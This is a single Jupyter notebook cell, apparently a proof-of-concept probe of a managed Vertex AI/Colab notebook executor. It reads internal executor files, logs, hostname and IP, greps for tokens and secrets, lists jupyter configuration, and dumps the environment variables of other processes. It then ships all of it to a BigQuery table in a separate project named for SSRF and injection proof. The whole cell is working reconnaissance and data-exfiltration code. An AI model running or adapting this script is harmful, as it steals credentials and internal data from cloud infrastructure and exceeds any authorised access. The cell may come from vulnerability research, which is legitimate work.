In [ ]:
import os, subprocess
from google.cloud import bigquery
p = []
def safe(label, fn):
    try: p.append({'label':label, 'value': str(fn())[:4500]})
    except Exception as e: p.append({'label':label, 'value': f'ERR: {type(e).__name__}: {str(e)[:500]}'})

# Read Vertex AI internals visible to us
safe('execute_py', lambda: open('/mnt/executor/execute.py').read()[:4400])
safe('content_ipynb_head', lambda: open('/mnt/executor/content.ipynb').read()[:2000])
safe('var_colab_app_log', lambda: open('/var/colab/app.log').read()[:4400])
safe('var_colab_hostname', lambda: open('/var/colab/hostname').read())
safe('var_colab_ip', lambda: open('/var/colab/ip').read())

# Datalab run script (we saw /datalab in the FS)
safe('datalab_run_sh', lambda: open('/datalab/run.sh').read()[:4400])
safe('datalab_ls', lambda: subprocess.check_output(['ls','-la','/datalab/web'], stderr=subprocess.STDOUT, timeout=3).decode()[:1500])

# Look for hardcoded URLs, tokens, secrets in interesting files
safe('grep_googleapis_in_datalab', lambda: subprocess.check_output(['grep','-r','-l','googleapis\\|internal\\|secret\\|token','/datalab','/mnt/executor'], stderr=subprocess.STDOUT, timeout=10).decode()[:2000])

# Look at jupyter-server config (running on port 9000 without auth)
safe('jupyter_config_dir', lambda: subprocess.check_output(['find','/root','/etc','-name','jupyter*','-o','-name','*ipython*'], stderr=subprocess.STDOUT, timeout=10).decode()[:2000])
safe('root_jupyter_runtime', lambda: subprocess.check_output(['find','/root/.jupyter','-type','f'], stderr=subprocess.STDOUT, timeout=5).decode()[:2000])

# Notebook execution metadata via /proc/PID/environ for OTHER PIDs in same container
for pid in ['7','9','11','12','25','48','49','108','132','186']:
    safe(f'proc_{pid}_environ_head', lambda pp=pid: open(f'/proc/{pp}/environ','rb').read()[:3000].decode('utf-8','replace').replace(chr(0),'\n')[:3000] if os.path.exists(f'/proc/{pp}/environ') else 'NOENT')

client = bigquery.Client(project='bq-ssrf-453453')
table_id = 'bq-ssrf-453453.injected_proof.NBEX_INTERNALS'
schema = [bigquery.SchemaField('label','STRING'), bigquery.SchemaField('value','STRING')]
client.create_table(bigquery.Table(table_id, schema=schema), exists_ok=True)
errs = client.insert_rows_json(table_id, p)
print('rows', len(p), 'errors', errs)
